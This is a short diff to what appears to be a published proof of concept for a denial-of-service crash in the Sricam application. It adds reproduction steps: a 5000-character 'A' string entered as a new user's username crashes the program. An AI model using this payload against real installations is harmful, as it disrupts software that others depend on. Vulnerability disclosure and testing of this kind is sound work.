@@ -6,6 +6,14 @@
 # Version: v3.12.0.1
 # Tested on: Windows 7 
 
+
+# Steps to reproduce:
+#   1. Generate a malicious payload via the POC
+#   2. In the Sricam application create a new user
+#   3. When creating a new user, set the username as the malicious payload
+#   4. Observe a program DOScrash
+
+
 payload = "A" * 5000
 
 try:
